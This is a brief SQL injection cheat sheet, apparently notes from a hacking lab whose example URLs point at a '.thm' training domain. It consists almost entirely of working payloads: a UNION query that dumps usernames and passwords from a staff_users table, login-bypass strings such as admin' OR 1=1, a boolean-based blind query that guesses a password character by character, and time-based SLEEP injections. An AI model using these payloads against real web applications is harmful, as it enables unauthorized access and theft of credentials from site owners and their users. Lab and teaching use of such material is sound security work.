> In-Band SQL Injection - Error-Based SQL Injection

```
article?id=-1 UNION SELECT 1,2,group_concat(username,':',password ) FROM staff_users
```

> Blind SQLi Injection - Authentication Bypass

```
admin' OR 1=1-- -
admin' OR 1=1-- -
' OR 1=1 --
admin' --
' UNION SELECT 1,2,3 --
```

> Blind SQLi - Boolean Based

```
https://website.thm/checkuser?username=admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
```

> Blind SQLi - Time Base

```
https://website.thm/analytics?referrer=admin123' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5), 2-- -
```


